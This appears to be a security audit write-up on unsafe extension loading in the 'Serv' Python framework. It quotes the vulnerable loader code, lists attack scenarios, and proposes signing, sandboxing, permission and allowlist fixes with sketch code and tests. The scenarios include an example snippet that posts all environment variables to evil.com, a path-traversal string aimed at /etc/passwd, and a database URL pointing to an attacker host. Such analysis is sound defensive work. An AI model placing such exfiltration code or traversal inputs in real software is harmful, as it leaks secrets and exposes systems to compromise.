# Extension Loading Security Risks

## Problem Description

The Serv framework's extension system allows arbitrary code execution from extension directories without proper security controls. Extensions can be loaded from various sources with no validation, signature checking, or sandboxing, creating a critical attack vector for malicious code injection.

### Current Vulnerable Code

**File**: `serv/extensions/loader.py` (lines 25-50)
```python
# Global dictionary that tracks loaded extensions - no security controls
known_extensions: "dict[Path, ExtensionSpec]" = {}

def find_extension_spec(path: Path) -> ExtensionSpec | None:
    """Load extension from path with NO SECURITY VALIDATION."""
    if path in known_extensions:
        return known_extensions[path]
    
    # Loads ANY Python module from path
    spec = _discover_extension_spec(path)
    if spec:
        known_extensions[path] = spec  # Global cache without cleanup
    return spec
```

**File**: `serv/extensions/importer.py` (lines 45-60)
```python
def import_from_string(import_string: str, extension_spec: ExtensionSpec) -> Any:
    """Imports ANY Python object specified in extension.yaml - DANGEROUS!"""
    module_path, attr_name = import_string.rsplit(".", 1)
    
    # No validation of what's being imported
    module = importlib.import_module(module_path)
    return getattr(module, attr_name)
```

**File**: Extension loading in `app.py` (lines 180-200)
```python
# Extensions loaded without any security checks
for extension_path in extension_dirs:
    for extension_spec in discover_extensions(extension_path):
        # Direct execution of extension code
        extension_instance = load_extension(extension_spec)
        self.add_extension(extension_instance)
```

### Attack Scenarios

1. **Malicious Extension Installation**: Attacker places malicious extension in extension directory:
   ```yaml
   # malicious_extension/extension.yaml
   name: "helpful_utility"
   listeners:
     - "malicious_module.steal_secrets"  # Executes arbitrary code
   ```

2. **Supply Chain Attack**: Legitimate extension gets compromised:
   ```python
   # In extension's main.py
   import os
   import requests
   
   # Malicious code hidden in legitimate extension
   if os.getenv('PROD') == 'true':
       requests.post('https://evil.com/exfiltrate', 
                    data={'secrets': os.environ})
   ```

3. **Path Traversal in Extension Loading**: Extension paths not properly validated:
   ```yaml
   # Extension config pointing outside allowed directories
   listeners:
     - "../../../etc/passwd.malicious_module"
   ```

4. **Configuration Injection**: Malicious extension.yaml with dangerous settings:
   ```yaml
   name: "legit_extension"
   settings:
     database_url: "postgresql://evil.com/steal_data"
     secret_key: "{{ env.SECRET_KEY }}"  # Template injection
   ```

## Impact Assessment

- **Severity**: 🔴 **CRITICAL**
- **CVSS Score**: 9.8 (Critical)
- **Attack Vector**: Local/Remote (depending on deployment)
- **Impact**: Complete system compromise, data exfiltration, privilege escalation
- **Affected Components**: Entire framework, all extensions

## Recommendations

### Option 1: Extension Signing & Verification (Recommended)
**Effort**: High | **Impact**: Critical

Implement cryptographic signing for extensions:

```python
import hashlib
import hmac
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding

class ExtensionSigner:
    def __init__(self, private_key_path: Path):
        self.private_key = self._load_private_key(private_key_path)
    
    def sign_extension(self, extension_path: Path) -> str:
        """Create signature for extension directory."""
        extension_hash = self._hash_extension_contents(extension_path)
        signature = self.private_key.sign(
            extension_hash.encode(),
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return base64.b64encode(signature).decode()

class ExtensionVerifier:
    def __init__(self, trusted_public_keys: list[Path]):
        self.public_keys = [self._load_public_key(key) for key in trusted_public_keys]
    
    def verify_extension(self, extension_path: Path, signature: str) -> bool:
        """Verify extension signature against trusted keys."""
        extension_hash = self._hash_extension_contents(extension_path)
        signature_bytes = base64.b64decode(signature)
        
        for public_key in self.public_keys:
            try:
                public_key.verify(
                    signature_bytes,
                    extension_hash.encode(),
                    padding.PSS(
                        mgf=padding.MGF1(hashes.SHA256()),
                        salt_length=padding.PSS.MAX_LENGTH
                    ),
                    hashes.SHA256()
                )
                return True
            except Exception:
                continue
        return False
```

### Option 2: Extension Sandboxing
**Effort**: Very High | **Impact**: High

Isolate extensions using containers or restricted execution:

```python
import subprocess
import tempfile
from pathlib import Path

class ExtensionSandbox:
    def __init__(self, extension_spec: ExtensionSpec):
        self.extension_spec = extension_spec
        self.sandbox_dir = self._create_sandbox()
    
    def execute_in_sandbox(self, function_name: str, *args, **kwargs):
        """Execute extension function in isolated environment."""
        # Create restricted Python environment
        sandbox_script = self._create_sandbox_script(function_name, args, kwargs)
        
        # Execute in container with limited privileges
        result = subprocess.run([
            'docker', 'run', '--rm',
            '--network=none',  # No network access
            '--memory=128m',   # Memory limit
            '--cpus=0.5',      # CPU limit
            '--read-only',     # Read-only filesystem
            '-v', f'{self.sandbox_dir}:/app:ro',  # Mount extension read-only
            'python:3.11-alpine',
            'python', '/app/sandbox_script.py'
        ], capture_output=True, timeout=30)
        
        return self._parse_sandbox_result(result)
```

### Option 3: Permission-based Extension System
**Effort**: Medium | **Impact**: High

Implement granular permissions for extensions:

```python
from enum import Enum

class ExtensionPermission(Enum):
    READ_FILES = "read_files"
    WRITE_FILES = "write_files"
    NETWORK_ACCESS = "network_access"
    DATABASE_ACCESS = "database_access"
    SYSTEM_COMMANDS = "system_commands"
    ENVIRONMENT_ACCESS = "environment_access"

class ExtensionContext:
    def __init__(self, permissions: set[ExtensionPermission]):
        self.permissions = permissions
        self._original_modules = {}
    
    def __enter__(self):
        # Replace dangerous modules with restricted versions
        if ExtensionPermission.NETWORK_ACCESS not in self.permissions:
            self._restrict_network()
        if ExtensionPermission.READ_FILES not in self.permissions:
            self._restrict_file_access()
        return self
    
    def _restrict_network(self):
        """Replace network modules with no-op versions."""
        import sys
        self._original_modules['requests'] = sys.modules.get('requests')
        sys.modules['requests'] = self._create_mock_requests()
```

### Option 4: Extension Allowlist System
**Effort**: Low | **Impact**: Medium

Simple allowlist of trusted extensions:

```python
class ExtensionAllowlist:
    def __init__(self, config_path: Path):
        self.trusted_extensions = self._load_allowlist(config_path)
    
    def is_extension_trusted(self, extension_spec: ExtensionSpec) -> bool:
        """Check if extension is in allowlist."""
        extension_id = f"{extension_spec.name}@{extension_spec.version}"
        return extension_id in self.trusted_extensions
    
    def _load_allowlist(self, config_path: Path) -> set[str]:
        """Load trusted extension list from config."""
        with open(config_path) as f:
            config = yaml.safe_load(f)
        return set(config.get('trusted_extensions', []))
```

## Action Checklist

### Phase 1: Immediate Risk Mitigation (Week 1)
- [ ] Implement extension allowlist system
- [ ] Add extension path validation (prevent directory traversal)
- [ ] Create extension loading audit logging
- [ ] Add configuration option to disable extension loading

### Phase 2: Enhanced Security (Week 2-3)
- [ ] Implement extension signing framework
- [ ] Create trusted key management system
- [ ] Add extension permission system
- [ ] Implement extension configuration validation

### Phase 3: Advanced Protection (Week 4)
- [ ] Design extension sandboxing architecture
- [ ] Create extension marketplace with security scanning
- [ ] Implement runtime monitoring for malicious behavior
- [ ] Add extension security documentation

### Code Changes Required

1. **New Files**:
   ```
   serv/security/extensions.py       # Extension security framework
   serv/security/signing.py          # Cryptographic signing
   serv/security/sandbox.py          # Extension sandboxing
   serv/security/permissions.py      # Permission system
   tests/security/test_extensions.py # Security tests
   ```

2. **Modified Files**:
   ```
   serv/extensions/loader.py         # Add security checks
   serv/extensions/importer.py       # Validate imports
   serv/app.py                       # Secure extension loading
   serv/config.py                    # Add security config
   ```

### Extension Security Configuration

```yaml
# serv.config.yaml
security:
  extensions:
    # Extension loading mode
    mode: "allowlist"  # allowlist, signed, sandbox, permissive
    
    # Trusted extension sources
    trusted_sources:
      - "path/to/trusted/extensions"
      - "https://trusted-registry.com"
    
    # Extension allowlist
    allowlist:
      - "core_auth@1.0.0"
      - "database_connector@2.1.0"
    
    # Signing configuration
    signing:
      enabled: true
      public_keys_dir: "/etc/serv/trusted-keys"
      require_signature: true
    
    # Permission defaults
    default_permissions:
      - "read_files"
      - "database_access"
    
    # Sandboxing options
    sandbox:
      enabled: false  # Requires Docker/containers
      memory_limit: "128m"
      network_access: false
```

### Testing Strategy

```python
def test_malicious_extension_blocked():
    """Test that malicious extensions are blocked."""
    malicious_extension = create_malicious_extension()
    
    with pytest.raises(SecurityError):
        app.load_extension(malicious_extension)

def test_unsigned_extension_rejected():
    """Test that unsigned extensions are rejected when signing is required."""
    app = App(extension_signing_required=True)
    unsigned_extension = create_unsigned_extension()
    
    with pytest.raises(ExtensionSignatureError):
        app.load_extension(unsigned_extension)

def test_extension_permission_enforcement():
    """Test that extension permissions are enforced."""
    limited_extension = create_extension_with_permissions(['read_files'])
    
    # Should fail when trying to access network
    with pytest.raises(PermissionError):
        limited_extension.make_network_request()
```

### Migration Strategy

1. **Phase 1**: Add allowlist system (backwards compatible)
2. **Phase 2**: Encourage extension signing (optional)
3. **Phase 3**: Make signing mandatory for new installations
4. **Phase 4**: Deprecate unsigned extensions

### Performance Considerations

- Extension signature verification adds ~50ms startup time per extension
- Sandboxing has significant overhead (2-5x slower execution)
- Permission checking adds minimal runtime overhead
- Consider caching verified extensions

### Documentation Updates

- [ ] Create extension security best practices guide
- [ ] Document extension signing process
- [ ] Add security configuration reference
- [ ] Create extension developer security guidelines